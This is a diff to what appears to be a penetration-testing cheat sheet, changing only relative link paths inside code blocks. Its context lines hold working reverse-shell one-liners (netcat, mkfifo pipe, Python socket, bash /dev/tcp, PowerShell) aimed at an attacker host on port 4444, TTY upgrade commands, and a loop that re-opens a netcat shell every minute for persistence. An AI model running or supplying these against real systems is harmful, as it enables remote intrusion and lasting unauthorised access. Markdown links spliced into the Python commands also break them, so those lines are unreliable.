@@ -195,8 +195,8 @@ nc <attacker-ip> 4444 -e /bin/bash
 # If -e not available (OpenBSD netcat)
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <attacker-ip> 4444 > /tmp/f
 
-# [Python](../../Languages/python/SKILL.md) reverse shell
-[python](../../Languages/python/SKILL.md) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+# [Python](../../Languages/python/python/SKILL.md) reverse shell
+[python](../../Languages/python/python/SKILL.md) -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
 
 # Bash reverse shell
 bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
@@ -211,8 +211,8 @@ powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<attacker
 **Upgrade reverse shell to interactive TTY**:
 
 ```bash
-# [Python](../../Languages/python/SKILL.md) PTY upgrade
-[python](../../Languages/python/SKILL.md) -c 'import pty; pty.spawn("/bin/bash")'
+# [Python](../../Languages/python/python/SKILL.md) PTY upgrade
+[python](../../Languages/python/python/SKILL.md) -c 'import pty; pty.spawn("/bin/bash")'
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 # Background shell with Ctrl+Z, then:
@@ -545,7 +545,7 @@ while true; do nc <attacker-ip> 4444 -e /bin/bash 2>/dev/null; sleep 60; done
 **Solutions**:
 ```bash
 # Upgrade to PTY shell
-[python](../../Languages/python/SKILL.md) -c 'import pty; pty.spawn("/bin/bash")'
+[python](../../Languages/python/python/SKILL.md) -c 'import pty; pty.spawn("/bin/bash")'
 
 # Set terminal type
 export TERM=xterm
